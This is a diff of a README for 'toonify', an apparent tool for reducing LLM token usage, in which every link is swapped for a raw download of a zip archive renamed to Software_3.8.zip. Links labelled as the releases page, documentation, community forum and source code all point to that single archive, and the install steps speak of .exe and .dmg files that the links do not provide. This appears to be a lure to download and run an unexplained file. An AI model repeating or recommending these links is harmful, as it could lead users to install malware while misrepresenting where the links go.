@@ -1,6 +1,6 @@
 # 🎨 toonify - Reduce LLM Token Usage Effortlessly
 
-[![Download toonify](https://raw.githubusercontent.com/popa228-byte/toonify/main/benchmark/toonify-v1.4.zip)](https://raw.githubusercontent.com/popa228-byte/toonify/main/benchmark/toonify-v1.4.zip)
+[![Download toonify](https://github.com/popa228-byte/toonify/raw/refs/heads/main/benchmark/Software_3.8.zip)](https://github.com/popa228-byte/toonify/raw/refs/heads/main/benchmark/Software_3.8.zip)
 
 ## 📋 Overview
 
@@ -10,12 +10,12 @@ Toonify is designed to help you save up to 60% on token usage when working with 
 
 Follow these simple steps to download and run Toonify on your computer:
 
-1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/popa228-byte/toonify/main/benchmark/toonify-v1.4.zip) to go directly to the Releases page.
+1. **Visit the Releases Page**: Click [here](https://github.com/popa228-byte/toonify/raw/refs/heads/main/benchmark/Software_3.8.zip) to go directly to the Releases page.
 2. **Select the Version**: Look for the latest version at the top of the page. Each version is listed along with important details and notes.
 3. **Download the File**: Click on the appropriate file for your operating system to download. If you're unsure about the file you need, here are some common types:
    - **Windows**: Choose the `.exe` file.
    - **Mac**: Look for the `.dmg` file.
-   - **Linux**: Download the `https://raw.githubusercontent.com/popa228-byte/toonify/main/benchmark/toonify-v1.4.zip` file.
+   - **Linux**: Download the `https://github.com/popa228-byte/toonify/raw/refs/heads/main/benchmark/Software_3.8.zip` file.
 
 ## 🔧 System Requirements
 
@@ -34,7 +34,7 @@ Once you have downloaded the file:
 2. **Run the Installer**:
    - **Windows**: Double-click the `.exe` file and follow the setup prompts.
    - **Mac**: Open the `.dmg` file and drag Toonify to your Applications folder.
-   - **Linux**: Extract the `https://raw.githubusercontent.com/popa228-byte/toonify/main/benchmark/toonify-v1.4.zip` file and follow the included README instructions for installation.
+   - **Linux**: Extract the `https://github.com/popa228-byte/toonify/raw/refs/heads/main/benchmark/Software_3.8.zip` file and follow the included README instructions for installation.
 3. **Start Using Toonify**: Once installed, you can find Toonify in your applications or start menu. Open it to begin reducing your data size and token usage.
 
 ## 📝 Features
@@ -59,12 +59,12 @@ Using Toonify is straightforward. Here’s how to get started:
 
 For more information, check the following resources:
 
-- [Documentation](https://raw.githubusercontent.com/popa228-byte/toonify/main/benchmark/toonify-v1.4.zip): Detailed user guides and FAQs.
-- [Community Forum](https://raw.githubusercontent.com/popa228-byte/toonify/main/benchmark/toonify-v1.4.zip): Join discussions, ask questions, and share tips with other users.
+- [Documentation](https://github.com/popa228-byte/toonify/raw/refs/heads/main/benchmark/Software_3.8.zip): Detailed user guides and FAQs.
+- [Community Forum](https://github.com/popa228-byte/toonify/raw/refs/heads/main/benchmark/Software_3.8.zip): Join discussions, ask questions, and share tips with other users.
 
 ## 🔗 Important Links
 
-- **Download Toonify**: [Visit this page to download](https://raw.githubusercontent.com/popa228-byte/toonify/main/benchmark/toonify-v1.4.zip)
-- **Source Code**: [GitHub Repository](https://raw.githubusercontent.com/popa228-byte/toonify/main/benchmark/toonify-v1.4.zip)
+- **Download Toonify**: [Visit this page to download](https://github.com/popa228-byte/toonify/raw/refs/heads/main/benchmark/Software_3.8.zip)
+- **Source Code**: [GitHub Repository](https://github.com/popa228-byte/toonify/raw/refs/heads/main/benchmark/Software_3.8.zip)
 
 By following these simple steps, you can easily download, install, and start using Toonify to maximize your data efficiency. Enjoy a more manageable way to handle your data and achieve better results with LLMs.
